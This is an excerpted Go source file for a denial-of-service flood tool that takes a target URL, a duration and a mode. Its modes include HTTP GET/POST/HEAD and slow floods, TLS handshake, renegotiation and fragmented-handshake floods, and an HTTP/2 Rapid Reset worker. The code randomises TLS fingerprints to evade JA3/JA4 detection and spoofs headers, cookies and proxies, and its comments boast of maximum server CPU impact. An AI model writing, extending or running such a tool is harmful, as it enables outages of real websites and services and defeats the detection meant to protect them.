...
var (
	...
	// ========== SOLID TLS FINGERPRINT SPOOFING ==========
	// ADDED: Ultimate TLS fingerprint profiles for JA3/JA4 bypass
	tlsFingerprints = []*tls.Config{
		// Chrome 120 - Most common browser
		{
		...
		// Legacy TLS 1.2 only (for older servers)
		{
		...
		// TLS 1.1 legacy (for very old servers)
		{
			NextProtos:         []string{"http/1.1"},
			InsecureSkipVerify: true,
	...
	// ADDED: All possible cipher suites for random selection
	...
	// ADDED: All possible ALPN protocols
	allAlpns = [][]string{
		{"h2", "http/1.1"},
		{"http/1.1"},
		{"h2"},
...
// ADDED: Get random TLS fingerprint
func getRandomTLSFingerprint() *tls.Config {
	idx := randInt(0, len(tlsFingerprints)-1)
	return tlsFingerprints[idx]
}

// ADDED: Generate random cipher suite list (for maximum randomization)
func generateRandomCipherSuites() []uint16 {
	// Randomly select 5-15 cipher suites
	count := randInt(5, 15)
	selected := make([]uint16, 0, count)
	
	// Create a copy and shuffle
	shuffled := make([]uint16, len(allCipherSuites))
...
// ADDED: Generate random curve preferences
func generateRandomCurves() []tls.CurveID {
	// Randomly select 1-4 curves
	count := randInt(1, 4)
	selected := make([]tls.CurveID, 0, count)
	
	shuffled := make([]tls.CurveID, len(allCurves))
	copy(shuffled, allCurves)
	for i := range shuffled {
		j := randInt(0, i)
		shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
	}
...
// ADDED: Generate completely random TLS config (maximum spoofing)
func generateRandomTLSConfig(host string) *tls.Config {
	// 30% chance to use a predefined fingerprint
	if randInt(1, 100) <= 30 {
		cfg := getRandomTLSFingerprint()
		cfg.ServerName = host
		return cfg
	}
	
	// Otherwise generate completely random config
	return &tls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
		MinVersion:         []uint16{tls.VersionSSL30, tls.VersionTLS10, tls.VersionTLS11, tls.VersionTLS12, tls.VersionTLS13}[randInt(0, 4)],
		MaxVersion:         []uint16{tls.VersionTLS10, tls.VersionTLS11, tls.VersionTLS12, tls.VersionTLS13}[randInt(0, 3)],
		CipherSuites:       generateRandomCipherSuites(),
		CurvePreferences:   generateRandomCurves(),
		NextProtos:         allAlpns[randInt(0, len(allAlpns)-1)],
	}
}
...
func rapidResetWorker(targetURL string, done chan struct{}, stats *atomicCounter) {
	...
	for {
		...
		case <-done:
			return
		default:
			// Create new connection for each batch with random TLS config
			conn, err := tls.Dial("tcp", host+":"+port, generateRandomTLSConfig(host))
			if err != nil {
			...
			for i := 0; i < 50; i++ {
				...
				default:
					...
					payloadLen := randInt(20, 200) // Random payload length
					...
					// Write compressed headers with random path
					headers := []byte{
						0x82, 0x86, // :method: GET
						0x84, 0x8a, byte(len(generateAdvancedPath())), 0x2f, // :path: with random path
					}
					conn.Write(headers)
...
// ADDED: Generate realistic cookies
...
// ========== TLS ATTACK WORKERS ==========
// ADDED: TLS Handshake Flood Worker (pure handshake, no HTTP)
func tlsHandshakeWorker(target, host, port string, done chan struct{}, stats *atomicCounter, useProxy bool) {
	for {
		select {
		case <-done:
			return
		default:
			...
			// Generate random TLS config for fingerprint spoofing
			tlsConfig := generateRandomTLSConfig(host)
			
			// Wrap with TLS and perform handshake (THIS IS THE KILLER)
			tlsConn := tls.Client(conn, tlsConfig)
			err = tlsConn.Handshake()
			
			if err == nil {
				stats.inc() // Successful handshake - heavy CPU usage on server
			}
			
			// Close immediately - we only care about the handshake
			tlsConn.Close()
		}
	}
}

// ADDED: TLS Renegotiation Flood Worker (double handshake)
func tlsRenegotiationWorker(target, host, port string, done chan struct{}, stats *atomicCounter, useProxy bool) {
	for {
		select {
		case <-done:
			return
		default:
			...
			// RENEGOTIATION - second handshake! (even heavier)
			err = tlsConn.Handshake()
			if err == nil {
				stats.inc()
			}
...
// ADDED: TLS Fragment Attack Worker (send fragmented handshake packets)
func tlsFragmentWorker(target, host, port string, done chan struct{}, stats *atomicCounter, useProxy bool) {
	for {
		select {
		case <-done:
			return
		default:
			...
			// Send fragmented TLS handshake
			// Client Hello fragment 1
			clientHelloFrag1 := []byte{
				0x16, // Handshake
				0x03, 0x01, // TLS 1.0
				0x00, 0x20, // Length
			...
			conn.Write(clientHelloFrag1)
			
			// Fragment 2
			time.Sleep(10 * time.Millisecond)
			clientHelloFrag2 := make([]byte, 32)
			rand.Read(clientHelloFrag2)
			conn.Write(clientHelloFrag2)
			
			// Fragment 3 - complete the handshake
			time.Sleep(10 * time.Millisecond)
			clientHelloFrag3 := []byte{
				0x00, 0x02, // Session ID length
				0x01, 0x02, // Session ID
				0x00, 0x04, // Cipher suites length
				0x00, 0x2f, 0x00, 0x35, // Cipher suites
			}
			conn.Write(clientHelloFrag3)
...
// ADDED: TLS + HTTP Worker (handshake + full HTTP request with all headers)
func tlsHTTPWorker(target, host, port, mode string, done chan struct{}, stats *atomicCounter, useProxy bool) {
	for {
		select {
		case <-done:
			return
		default:
			...
			// Generate path and headers (SAME as your GET worker!)
			...
			// Build HTTP request with ALL your headers
			var req *http.Request
			if mode == "TLS-GET" {
				req, _ = http.NewRequest("GET", "https://"+host+path, nil)
			} else if mode == "TLS-POST" {
				payload, contentType := generatePostPayload()
				req, _ = http.NewRequest("POST", "https://"+host+path, strings.NewReader(payload))
				req.Header.Set("Content-Type", contentType)
				req.ContentLength = int64(len(payload))
			} else if mode == "TLS-HEAD" {
				req, _ = http.NewRequest("HEAD", "https://"+host+path, nil)
			} else {
				continue
			}
			
			// ===== ALL YOUR HEADER SPOOFING =====
			...
			// Cookies
			if randBool() {
				if cookies := generateCookies(); cookies != "" {
			...
			// Optional: Pipeline multiple requests
			if randInt(1, 100) <= 30 && mode == "TLS-GET" {
...
func main() {
	...
	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: go run main.go <target> <seconds> <GET|POST|HEAD|SLOW|TLS-HANDSHAKE|TLS-RENEG|TLS-FRAG|TLS-GET|TLS-POST|TLS-HEAD> [proxy]")
		fmt.Println("   [proxy] → optional if you want to use proxy")
		fmt.Println("   TLS Modes:")
		fmt.Println("     TLS-HANDSHAKE - Pure handshake flood (heaviest CPU)")
		fmt.Println("     TLS-RENEG     - Double handshake renegotiation")
		fmt.Println("     TLS-FRAG      - Fragmented handshake packets")
		fmt.Println("     TLS-GET       - TLS + GET with full headers")
		fmt.Println("     TLS-POST      - TLS + POST with full headers")
		fmt.Println("     TLS-HEAD      - TLS + HEAD with full headers")
		os.Exit(1)
	}
	...
	validModes := map[string]bool{
		"GET": true, "POST": true, "HEAD": true, "SLOW": true,
		"TLS-HANDSHAKE": true, "TLS-RENEG": true, "TLS-FRAG": true,
		"TLS-GET": true, "TLS-POST": true, "TLS-HEAD": true,
	}

	if !validModes[mode] {
		printBanner()
		fmt.Println("Invalid mode. Use: GET, POST, HEAD, SLOW, TLS-HANDSHAKE, TLS-RENEG, TLS-FRAG, TLS-GET, TLS-POST, TLS-HEAD")
		os.Exit(1)
	}
	...
	// Force HTTPS for TLS modes
	if strings.HasPrefix(mode, "TLS-") && u.Scheme != "https" {
		u.Scheme = "https"
	...
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" || strings.HasPrefix(mode, "TLS-") {
			port = "443"
		} else {
			port = "80"
		}
	...
	if strings.HasPrefix(mode, "TLS-") {
		fmt.Printf("[+] TLS Fingerprint Spoofing: ENABLED (JA3/JA4 bypass)\n")
		fmt.Printf("[+] Cipher Suite Randomization: ENABLED\n")
		fmt.Printf("[+] TLS Version Rotation: ENABLED\n")
	}
	...
	// Check if target supports HTTP/2 for Rapid Reset
	h2Supported := false
	...
	if mode == "GET" && h2Supported {
		...
		for i := 0; i < normalWorkers; i++ {
			...
			go func(id int) {
				defer wg.Done()
				attackWorker(target, host, mode, done, stats, useProxy)
			}(i)
		}
	} else if strings.HasPrefix(mode, "TLS-") {
		// TLS attack modes
		var workerFunc func(string, string, string, chan struct{}, *atomicCounter, bool)
		
		switch mode {
		case "TLS-HANDSHAKE":
			workerFunc = tlsHandshakeWorker
			fmt.Printf("[+] Pure TLS Handshake Flood - HEAVIEST CPU IMPACT!\n")
		case "TLS-RENEG":
			workerFunc = tlsRenegotiationWorker
			fmt.Printf("[+] TLS Renegotiation Flood - DOUBLE HANDSHAKE!\n")
		case "TLS-FRAG":
			workerFunc = tlsFragmentWorker
			fmt.Printf("[+] TLS Fragment Attack - EVASION + IMPACT!\n")
		case "TLS-GET", "TLS-POST", "TLS-HEAD":
			// For HTTP+ modes, need to pass mode parameter
			for i := 0; i < workers; i++ {
				wg.Add(1)
				go func(id int) {
					defer wg.Done()
		...
		for i := 0; i < workers; i++ {
			...
			go func(id int) {
				defer wg.Done()
				workerFunc(target, host, port, done, stats, useProxy)
			}(i)
		}
	} else {
		// Normal flood only
	...
	go func() {
		...
		for {
			...
			case <-ticker.C:
				...
				fmt.Printf("[+] Total operations: %d\n", stats.get())
				fmt.Printf("[+] Current RPS/HPS: %.0f\n", rps)
				if strings.HasPrefix(mode, "TLS-") {
					fmt.Printf("[+] TLS Fingerprint Rotation: ACTIVE\n")
				}
				if useProxy && len(proxies) > 0 {
...
func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCounter, useProxy bool) {
	...
	// >>> ITO ANG DINAGDAG KO - DEFINE PORT <<<
	port := "80"
		...
		if proxyStr != "" {
			...
			if err == nil {
				tr := &http.Transport{
					...
					TLSClientConfig:     getRandomTLSFingerprint(),
					MaxIdleConns:        4000,
	...
	for {
		...
		default:
			...
			if mode == "SLOW" {
				// >>> ITO YUNG BINAGO KO - host to host+":"+port <<<
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
